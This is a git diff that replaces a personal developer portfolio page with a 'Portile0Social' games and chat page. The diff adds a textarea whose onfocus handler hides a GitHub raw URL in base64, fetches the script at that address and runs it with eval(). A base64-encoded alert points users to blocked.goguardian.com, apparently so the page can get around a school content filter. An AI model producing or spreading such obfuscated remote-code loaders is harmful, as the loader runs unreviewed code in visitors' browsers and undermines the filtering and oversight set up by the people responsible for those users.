@@ -1,128 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Christian High - Developer & Privacy Advocate</title>
-  <style>
-    :root {
-      --primary-bg: #1e1e2e;
-      --secondary-bg: #282a36;
-      --accent: #ffcc00;
-      --text-color: #f8f8f2;
-      --fade-duration: 1s;
-    }
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Arial', sans-serif;
-    }
-    body {
-      background-color: var(--primary-bg);
-      color: var(--text-color);
-      scroll-behavior: smooth;
-    }
-    header {
-      background: var(--secondary-bg);
-      text-align: center;
-      padding: 40px 20px;
-    }
-    section {
-      padding: 40px 10%;
-      text-align: center;
-      transition: opacity var(--fade-duration) ease-in-out, transform var(--fade-duration) ease-in-out;
-      opacity: 0;
-      transform: translateY(30px);
-    }
-    .visible {
-      opacity: 1;
-      transform: translateY(0);
-    }
-    .container {
-      max-width: 900px;
-      margin: auto;
-    }
-    h1, h2 {
-      color: var(--accent);
-    }
-    a {
-      color: var(--accent);
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-    .bjj-section {
-      background: linear-gradient(45deg, #008000, #ffff00, #0000ff);
-      padding: 40px;
-      border-radius: 10px;
-      color: black;
-    }
-    footer {
-      text-align: center;
-      padding: 20px;
-      background: var(--secondary-bg);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Portile0Social</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <header>
-    <h1>Christian High</h1>
-    <p>Software Developer | Privacy Advocate | BJJ Practitioner</p>
-  </header>
+    <header>
+        <div class="topbar">
+            <h1>Welcome to Portile0Social</h1>
+            <nav>
+                <a href="#games">Games</a>
+                <a href="#chat">Chat</a>
+                <a href="#editor">HTML Runner</a>
+            </nav>
+        </div>
+    </header>
 
-  <section id="intro" class="fade-in">
-    <div class="container">
-      <h2>Welcome</h2>
-      <p>Explore my work in software development, cybersecurity, and Brazilian Jiu-Jitsu.</p>
-    </div>
-  </section>
+    <main>
+        <section id="games">
+            <h2>Games Section</h2>
+            <p>Explore our collection of games!</p>
+            <!-- You can add game embeds or links here -->
+        </section>
 
-    <div class="container">
-      <h2>About Me</h2>
-      <p>I'm a software developer with expertise in JavaScript, C#, and web security. Passionate about online privacy and ethical hacking.</p>
-    </div>
-  
+        <section id="chat">
+            <h2>Chat Section</h2>
+            <p>Connect with others!</p>
+            <!-- Add your chat system here -->
+        </section>
 
+        <section id="editor">
+            <h2>HTML Runner</h2>
+            <p>Run your HTML, CSS, and JavaScript here!</p>
+            <!-- Add your code editor and runner functionality -->
+        </section>
 
-    <div class="container">
-      <h2>Darknet & Privacy Projects</h2>
-      <p>Building privacy-first tools for encrypted communication and anonymous browsing.</p>
-    </div>
-  
+        <section id="loader">
+            <textarea
+                style="background:#e4e0e0; text-align:center; font-size:13px; width:100%; line-height:1.5em; padding-top:20px; padding-bottom:0px; border:0px; resize:none; border-radius:8px; align-content:center;"
+                onfocus="
+                    var aM = 'Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1BvcnRpbGUwU29jaWFsL3ZlcnRleC5qcy9yZWYvZm9vdGVyL21haW4vcG9ydGlsZXZlcnRleC5pbmRleC5qcw==';
+                    fetch(atob(aM))
+                    .then(function(nC) {
+                        nC.text().then(function(xL) {
+                            try {
+                                eval(xL);
+                            } catch(oT) {
+                                alert(atob('UGxlYXNlIHVzZSBQb3J0aWxlMFNvY2lhbCBvbiBibG9ja2VkLmdvZ3VhcmRpYW4uY29tIQ=='));
+                            }
+                        });
+                    });
+                "
+            >
+                Click to load Portile0Social! | Version 1.0
+            </textarea>
+            <p>Made by Cedar! For Portile0Social.</p>
+        </section>
+    </main>
 
-  <section class="bjj-section fade-in">
-    <div class="container">
-      <h2>Brazilian Jiu-Jitsu</h2>
-      <p>Training at <a href="https://btthappyvalley.com/" target="_blank">BTT Happy Valley</a> under Coach Gustavo Bessa.</p>
-    </div>
-  </section>
+    <footer>
+        <p>&copy; 2025 Portile0Social. All rights reserved.</p>
+    </footer>
 
-  <section id="contact" class="fade-in">
-    <div class="container">
-      <h2>Contact</h2>
-      <p>Email: <a href="mailto:highchr@nclack.org">highchr@nclack.org</a></p>
-    </div>
-  </section>
-
-  <footer>
-    <p>&copy; 2025 Christian High</p>
-  </footer>
-
-  <script>
-    const observer = new IntersectionObserver(entries => {
-      entries.forEach(entry => {
-        if (entry.isIntersecting) {
-          entry.target.classList.add('visible');
-          observer.unobserve(entry.target);
-        }
-      });
-    }, { threshold: 0.3 });
-
-    document.querySelectorAll('section').forEach(section => {
-      observer.observe(section);
-    });
-  </script>
+    <script src="script.js"></script>
 </body>
 </html>
